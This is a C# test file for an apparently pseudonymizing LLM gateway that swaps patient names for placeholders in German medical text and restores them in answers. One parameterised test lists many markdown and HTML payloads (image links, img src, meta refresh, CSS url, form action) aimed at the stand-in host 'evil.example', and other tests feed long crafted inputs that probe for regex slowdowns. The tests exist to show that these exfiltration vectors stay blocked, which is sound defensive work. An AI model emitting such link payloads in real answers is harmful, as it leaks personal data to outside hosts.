using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text.Json.Nodes;
using Zwijg.Core.Pseudonymization;

namespace Zwijg.Tests;

public class PlaceholderTests(GatewayFactory factory) : IClassFixture<GatewayFactory>
{
    private readonly Pseudonymizer _pseudonymizer = Pseudonymizer.CreateDefault();

    private const string AlreadyProtected = "Befund für [NAME_1] liegt vor. Frau Schmidt bitte anrufen.";

    [Fact]
    public async Task Platzhalter_in_der_Eingabe_kollidieren_nicht()
    {
        var map = new PseudonymMap();

        var text = await _pseudonymizer.PseudonymizeAsync(AlreadyProtected, map);

        Assert.DoesNotContain("Schmidt", text);
        Assert.Contains("[NAME_2]", text);
        Assert.Equal(AlreadyProtected, map.Restore(text));
    }

    [Fact]
    public async Task Auch_eigene_Bezeichnungen_werden_reserviert()
    {
        var map = new PseudonymMap();
        var input = "Laut [GEHEIM_1] und Projekt Nordlicht";

        var text = await _pseudonymizer.PseudonymizeAsync([input], map, secrets: [new SecretTerm("Projekt Nordlicht", "GEHEIM")]);

        Assert.Equal("Laut [GEHEIM_1] und [GEHEIM_2]", text[0]);
        Assert.Equal(input, map.Restore(text[0]));
    }

    [Fact]
    public async Task Chat_verwechselt_keine_Patienten()
    {
        var client = factory.CreateClient();
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "user-key");

        var res = await client.PostAsJsonAsync("/v1/chat/completions",
            new { model = "auto", messages = new[] { new { role = "user", content = AlreadyProtected } } });

        res.EnsureSuccessStatusCode();
        var answer = (await res.Content.ReadFromJsonAsync<JsonObject>())!["choices"]![0]!["message"]!["content"]!.GetValue<string>();
        Assert.Equal("Echo: " + AlreadyProtected, answer);
    }

    [Theory]
    [InlineData("![x](https://evil.example/?p=[NAME_1])")]
    [InlineData("[Link](https://evil.example/[NAME_1])")]
    [InlineData("Siehe https://evil.example/?p=[NAME_1] für mehr")]
    [InlineData("<https://evil.example/?p=[NAME_1]>")]
    [InlineData("<img src=\"https://evil.example/?p=[NAME_1]\">")]
    [InlineData("[x]: https://evil.example/[NAME_1]")]
    [InlineData("![x][r]\n\n[r]: //evil.example/?p=[NAME_1]")]
    [InlineData("[r]: <//evil.example/[NAME_1]>")]
    [InlineData("[r]: /pfad/[NAME_1]")]
    [InlineData("[r]:\n   //evil.example/[NAME_1]")]
    [InlineData("![x][r]\r\n\r\n[r]:\r\n   /pfad/[NAME_1]")]
    [InlineData("Bild: //evil.example/[NAME_1]")]
    [InlineData("![x]( //evil.example/[NAME_1] )")]
    [InlineData("![x](<//evil.example/[NAME_1] x>)")]
    [InlineData("<img srcset=\"/x/[NAME_1] 1x\">")]
    [InlineData("<video poster=\"//evil.example/[NAME_1]\"></video>")]
    [InlineData("<object data=\"/x/[NAME_1]\"></object>")]
    [InlineData("<form action='/x/[NAME_1]'></form>")]
    [InlineData("<a href=\"/ok\" ping=/x/[NAME_1]>x</a>")]
    [InlineData("<div style=\"background:url('/x/[NAME_1]')\">x</div>")]
    [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=/x/[NAME_1]\">")]
    public async Task In_Links_bleibt_der_Platzhalter_stehen(string answer)
    {
        var map = new PseudonymMap();
        await _pseudonymizer.PseudonymizeAsync("Frau Schmidt hat Fieber.", map);

        Assert.Equal(answer, map.Restore(answer));
    }

    [Theory]
    [InlineData("<a:", 100_000)]
    [InlineData("a.", 100_000)]
    [InlineData("url(", 100_000)]
    [InlineData("[NAME_1] x://y ", 16_000)]
    public async Task Lange_boesartige_Antwort_bleibt_schnell(string piece, int count)
    {
        var map = new PseudonymMap();
        await _pseudonymizer.PseudonymizeAsync("Frau Schmidt hat Fieber.", map);
        var answer = string.Concat(Enumerable.Repeat(piece, count)) + " [NAME_1]";

        var watch = System.Diagnostics.Stopwatch.StartNew();
        map.Restore(answer);
        watch.Stop();

        Assert.True(watch.Elapsed < TimeSpan.FromSeconds(1), $"Dauerte {watch.ElapsedMilliseconds} ms");
    }

    [Fact]
    public async Task Referenz_ohne_Ziel_mit_vielen_Leerzeichen_bleibt_schnell()
    {
        var map = new PseudonymMap();
        await _pseudonymizer.PseudonymizeAsync("Frau Schmidt hat Fieber.", map);
        var answer = "[NAME_1]\n[x]:" + new string(' ', 300_000);

        var watch = System.Diagnostics.Stopwatch.StartNew();
        var restored = map.Restore(answer);
        watch.Stop();

        Assert.StartsWith("Schmidt", restored);
        Assert.True(watch.Elapsed < TimeSpan.FromSeconds(1), $"Dauerte {watch.ElapsedMilliseconds} ms");
    }

    [Fact]
    public async Task Im_Fliesstext_wird_weiter_eingesetzt()
    {
        var map = new PseudonymMap();
        await _pseudonymizer.PseudonymizeAsync("Frau Schmidt hat Fieber.", map);

        Assert.Equal("Gute Besserung, Schmidt. Mehr unter https://example.org/fieber",
            map.Restore("Gute Besserung, [NAME_1]. Mehr unter https://example.org/fieber"));
        Assert.Equal("[Schmidt](https://example.org)", map.Restore("[[NAME_1]](https://example.org)"));
    }
}
